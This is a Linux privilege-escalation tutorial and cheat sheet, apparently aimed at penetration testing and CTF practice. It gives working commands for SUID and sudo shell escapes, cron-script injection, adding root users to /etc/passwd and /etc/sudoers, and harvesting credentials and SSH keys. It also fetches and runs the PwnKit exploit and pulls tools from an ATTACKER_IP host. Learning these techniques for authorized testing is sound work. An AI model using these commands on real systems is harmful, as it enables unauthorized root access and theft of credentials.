Linux Privilege Escalation

The art of moving from a low-privilege shell to root. After gaining initial access, PrivEsc is almost always the next step. Linux systems are rich with misconfigurations — this guide covers the most common and reliable vectors.

The Mindset

Privilege escalation is about finding what is misconfigured, over-permissioned, or vulnerable on the system. There is no single magic command — you must enumerate thoroughly first, then attack the most promising vector.

1. Enumerate Everything

System info, users, SUID bits, sudo rules, running processes, cron jobs, writable files, network services, passwords in files.

2. Find the Weakness

A misset SUID binary, a sudo rule that allows a dangerous command, a cron job running as root with a writable script.

3. Exploit & Escalate

Use GTFOBins, craft a payload, or exploit a kernel vulnerability to gain a root shell or write to /etc/passwd/sudoers.

4. Verify Root

Confirm with id, whoami, cat /root/root.txt, or sudo -i on the escalated shell.

Initial Enumeration Commands

bash — System Recon
# WHO AM I + system info
id                              # current user, uid, groups
whoami
uname -a                        # kernel version — check for kernel exploits
uname -r
cat /proc/version
cat /etc/os-release             # distro + version
hostname

# USERS
cat /etc/passwd                 # all user accounts
cat /etc/shadow                 # password hashes (if readable)
cat /etc/group                  # groups
who                             # who is logged in
w
last                            # login history

# SUDO
sudo -l                         # what can current user run as sudo?
sudo -V                         # sudo version — check for CVEs

# ENVIRONMENT
env                             # environment variables
echo $PATH
history                         # bash history — may contain passwords
cat ~/.bash_history
cat ~/.zsh_history

SUID / SGID Binaries

SUID (Set User ID) binaries run with the file owner's privileges, not the caller's. If root owns an SUID binary and it can be abused, you get root. Common misconfigurations include find, vim, python, nmap (old versions), cp, bash.

bash — SUID Enumeration & Exploitation
# Find all SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null   # equivalent

# Find SGID binaries (runs as group owner)
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Find both SUID and SGID
find / -perm -6000 -type f 2>/dev/null

# Common exploitable SUID binaries (check GTFOBins for each):
# /bin/bash     /usr/bin/find   /usr/bin/vim   /usr/bin/python
# /usr/bin/nmap /usr/bin/cp     /bin/nano       /usr/bin/perl

# EXPLOITATION EXAMPLES (via GTFOBins):

# bash with SUID
/bin/bash -p                    # -p preserves effective UID (euid = root)

# find with SUID
./find . -exec /bin/sh -p \; -quit

# vim with SUID
./vim -c ':!/bin/sh'            # opens root shell from inside vim

# python with SUID
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# nmap (old versions) with SUID
echo "os.execute('/bin/sh')" > /tmp/shell.nse
./nmap --script=/tmp/shell.nse

# cp with SUID — add root user to /etc/passwd
echo "hacked:$(openssl passwd hacked):0:0:root:/root:/bin/bash" > /tmp/newroot
./cp /tmp/newroot /etc/passwd
su hacked                        # password: hacked

Always check GTFOBins (gtfobins.github.io) — it documents exactly how to abuse common Unix binaries for SUID, sudo, and shell escapes.

Sudo Misconfigurations

Always run sudo -l immediately after getting a shell. Misconfigurations here are one of the most common and reliable PrivEsc vectors.

bash — Sudo Exploitation
# Check what current user can run with sudo
sudo -l
# Example output:
# (ALL) NOPASSWD: /usr/bin/vim
# (root) /usr/bin/python3 /opt/script.py

# If user can run everything as root:
(ALL : ALL) ALL   →   sudo su, sudo bash, sudo -i

# Common sudo exploitation (GTFOBins):

# sudo vim
sudo vim -c ':!/bin/bash'

# sudo python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# sudo find
sudo find . -exec /bin/bash \; -quit

# sudo nano  -- drop to shell inside nano
sudo nano
# Press Ctrl+R then Ctrl+X → type: reset; sh 1>&0 2>&0

# sudo less / man  -- shell escape
sudo less /etc/hosts → press !bash

# sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'

# sudo env / sudo -s  -- run shell as root
sudo env /bin/bash
sudo -s

# sudo cat  -- read sensitive files
sudo cat /etc/shadow
sudo cat /root/root.txt

# Writable script executed by sudo
# If (root) NOPASSWD: /usr/bin/python3 /opt/script.py
# AND /opt/script.py is writable by current user:
echo 'import os; os.system("chmod +s /bin/bash")' >> /opt/script.py
sudo /usr/bin/python3 /opt/script.py
/bin/bash -p

Cron Job Abuse

Cron jobs run automatically on a schedule. If a cron job runs a script as root and that script is writable by you, you can inject malicious commands that run as root.

bash — Cron Enumeration & Exploitation
# List cron jobs (various locations)
crontab -l                         # current user's crons
sudo crontab -l                    # root's crons
cat /etc/crontab                   # system-wide crons
ls -la /etc/cron*                  # cron.d, cron.hourly, etc.
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/*

# View running processes to catch cron execution
watch -n 1 "ps aux | grep --color cron"

# Use pspy to monitor processes without root
./pspy64                            # lists processes incl. cron jobs as they run

# Exploit: writable cron script
# If /opt/cleanup.sh runs as root every minute and is writable:
echo 'chmod +s /bin/bash' >> /opt/cleanup.sh
# Wait for cron to run...
bash -p                             # get root shell

# Exploit: writable PATH in crontab
# Crontab: PATH=/home/user:/usr/local/sbin
# Script calls "curl" without full path — you put malicious curl in /home/user:
echo '#!/bin/bash\nchmod +s /bin/bash' > /home/user/curl
chmod +x /home/user/curl
# Wait for cron, then: bash -p

Writable Files & Paths

bash — Writable File Hunting
# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# World-writable directories
find / -writable -type d 2>/dev/null

# Check /etc/passwd write permission (critical misconfiguration)
ls -la /etc/passwd
# If writable: add a root user manually
echo 'r00t:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd
su r00t

# Check /etc/sudoers
ls -la /etc/sudoers
# If writable: add yourself to sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
sudo bash

# Find files owned by root but writable by all
find / -user root -perm -002 -type f 2>/dev/null

Credential & Secret Hunting

bash — Find Passwords & Keys
# Search for passwords in files
grep -ria "password" /var/www/ 2>/dev/null
grep -ria "passwd" /etc/ 2>/dev/null
grep -rn "password" /home/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

# Common config files with credentials
cat /var/www/html/config.php
cat /var/www/html/wp-config.php         # WordPress DB creds
cat /etc/phpmyadmin/config.inc.php
cat ~/.ssh/id_rsa                        # private SSH key
find / -name "id_rsa" 2>/dev/null
find / -name "*.key" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Database credential files
cat /var/lib/mysql/.my.cnf
cat /root/.my.cnf
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history

Kernel Exploits

When nothing else works, check if the kernel version has a known public exploit. These are noisy and can crash systems — use as a last resort.

bash — Kernel Exploit Recon
# Get kernel version
uname -r              # example: 3.13.0-24-generic
uname -a

# Search for exploits
searchsploit linux kernel 3.13  # search Exploit-DB locally
searchsploit linux local privilege escalation

# Famous kernel exploits:
# - DirtyCow (CVE-2016-5195)    Linux 2.6.22 - 4.8.3
# - PTRACE_TRACEME (CVE-2019-13272)  Linux < 5.1.17
# - PwnKit (CVE-2021-4034)      pkexec privilege escalation ALL Linux
# - DirtyPipe (CVE-2022-0847)   Linux 5.8 - 5.16.11

# DirtyCow compile + run
gcc -pthread dirtycow.c -o dirtycow -lcrypt
./dirtycow /etc/passwd newpasswd

# PwnKit — instant root on almost all Linux systems
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit && ./PwnKit

Warning: Kernel exploits can crash the target system. Always attempt other vectors first. Never run untested exploits on production systems.

Automated Enumeration Tools

These scripts automate the enumeration process and highlight potential vectors — save hours of manual work:

bash — PrivEsc Automation Tools
# LinPEAS — most comprehensive Linux PrivEsc script
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# OR transfer to target:
wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas_output.txt

# LinEnum — classic thorough enumeration script
wget http://ATTACKER_IP:8000/LinEnum.sh -O /tmp/LinEnum.sh
chmod +x /tmp/LinEnum.sh && /tmp/LinEnum.sh -t 2>&1 | tee /tmp/linenum.txt

# linux-exploit-suggester — match kernel to known exploits
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh

# pspy — monitor processes without root (find cron jobs)
wget http://ATTACKER_IP:8000/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64 && /tmp/pspy64

# Serve files from your attacker machine
python3 -m http.server 8000          # run on attacker
# then wget from victim to pull files

Workflow: Run LinPEAS first — read the output carefully focusing on red-highlighted items. Then cross-reference anything suspicious with GTFOBins. Manually verify before exploiting.
